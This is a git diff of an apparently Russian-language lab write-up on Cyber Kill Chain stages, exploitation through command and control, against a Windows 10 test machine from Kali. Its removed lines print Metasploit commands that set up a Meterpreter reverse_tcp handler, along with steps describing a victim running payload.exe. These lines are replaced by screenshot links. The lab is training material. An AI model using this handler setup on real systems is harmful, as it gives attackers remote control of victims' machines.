@@ -40,30 +40,14 @@
 
 <img width="837" height="338" alt="image" src="https://github.com/user-attachments/assets/87a15d4e-efe5-42cb-b4b1-0b8f13aa7ed9" />
 
-2.	Доставка одним из эксплойтов из состава Metasploit.
-
-<img width="1155" height="743" alt="image" src="https://github.com/user-attachments/assets/dab8895c-dfee-42e0-9f98-eef5103776fe" />
-
-![Uploading image.png…]()
-
-
-
 ### Этап 4: Эксплуатация (Exploitation)
 ### Этап 5: Установка (Installation)
 
 Цель - заставить жертву запустить файл и получить контроль над системой.
 
-Практическое действие:
-1.	Подготовка атакующего: Запустите msfconsole (фреймворк Metasploit) на Kali. Настройте обработчик (handler), который будет ждать соединение от полезной нагрузки:
+<img width="846" height="367" alt="image" src="https://github.com/user-attachments/assets/8c4e8e8f-3964-49a4-93e6-faa97a87dbe5" />
 
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <IP-адрес Kali>
-set LPORT 4444
-exploit
-
-2.	Действие жертвы: На целевой машине Windows 10 пользователь запускает payload.exe (имитируя неосторожность). Может появиться окно UAC (Контроль учетных записей) — это точка возможного срыва атаки!
-3.	Результат: Если пользователь подтвердит запуск, в консоли Metasploit на Kali появится сессия Meterpreter. Этапы Exploitation и Installation пройдены — вредоносный код выполнился и установил себя в памяти.
+<img width="852" height="270" alt="image" src="https://github.com/user-attachments/assets/aec231af-0fac-4827-9c35-7091bbd77e2b" />
 
 ### Этап 6: Установление командования и управления (C2)
 
